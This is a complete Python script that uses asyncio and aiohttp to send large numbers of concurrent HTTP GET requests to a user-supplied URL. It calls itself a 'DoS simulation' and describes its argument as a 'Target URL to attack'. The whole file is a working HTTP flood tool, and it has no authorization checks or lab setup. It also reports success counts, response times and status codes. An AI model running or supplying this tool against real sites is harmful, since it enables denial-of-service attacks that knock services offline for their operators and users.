import asyncio
import aiohttp
import time
import argparse
from concurrent.futures import ThreadPoolExecutor

async def send_request(session, url, timeout=5):
    """
    Send a single HTTP request to the specified URL
    
    :param session: aiohttp ClientSession
    :param url: Target URL
    :param timeout: Request timeout in seconds
    :return: Response status and time taken
    """
    try:
        start_time = time.time()
        async with session.get(url, timeout=timeout) as response:
            end_time = time.time()
            return response.status, end_time - start_time
    except Exception as e:
        return str(e), 0

async def dos_attack(url, num_requests, concurrency=100):
    """
    Perform a DoS simulation
    
    :param url: Target URL
    :param num_requests: Total number of requests to send
    :param concurrency: Number of concurrent requests
    """
    print(f"Starting DoS simulation against {url}")
    print(f"Total requests: {num_requests}")
    print(f"Concurrency: {concurrency}")

    # Tracking metrics
    successful_requests = 0
    failed_requests = 0
    total_response_time = 0
    status_codes = {}

    async with aiohttp.ClientSession() as session:
        # Create a semaphore to limit concurrent requests
        semaphore = asyncio.Semaphore(concurrency)

        async def bounded_send_request(url):
            nonlocal successful_requests, failed_requests, total_response_time, status_codes
            async with semaphore:
                response, response_time = await send_request(session, url)
                
                if isinstance(response, int):  # Successful HTTP request
                    successful_requests += 1
                    total_response_time += response_time
                    status_codes[response] = status_codes.get(response, 0) + 1
                else:
                    failed_requests += 1

        # Create tasks
        tasks = [bounded_send_request(url) for _ in range(num_requests)]
        
        # Execute tasks
        start_time = time.time()
        await asyncio.gather(*tasks)
        end_time = time.time()

    # Calculate and print results
    print("\n--- DoS Simulation Results ---")
    print(f"Total Time: {end_time - start_time:.2f} seconds")
    print(f"Successful Requests: {successful_requests}")
    print(f"Failed Requests: {failed_requests}")
    
    if successful_requests > 0:
        print(f"Average Response Time: {total_response_time / successful_requests:.4f} seconds")
    
    print("\nStatus Code Distribution:")
    for code, count in sorted(status_codes.items()):
        print(f"  {code}: {count} requests")

def main():
    parser = argparse.ArgumentParser(description="Simple DoS Simulation Tool")
    parser.add_argument("url", help="Target URL to attack")
    parser.add_argument("-n", "--num-requests", type=int, default=1000, 
                        help="Number of total requests (default: 1000)")
    parser.add_argument("-c", "--concurrency", type=int, default=100, 
                        help="Number of concurrent requests (default: 100)")
    
    args = parser.parse_args()

    try:
        asyncio.run(dos_attack(args.url, args.num_requests, args.concurrency))
    except KeyboardInterrupt:
        print("\nDoS simulation interrupted by user.")

if __name__ == "__main__":
    main()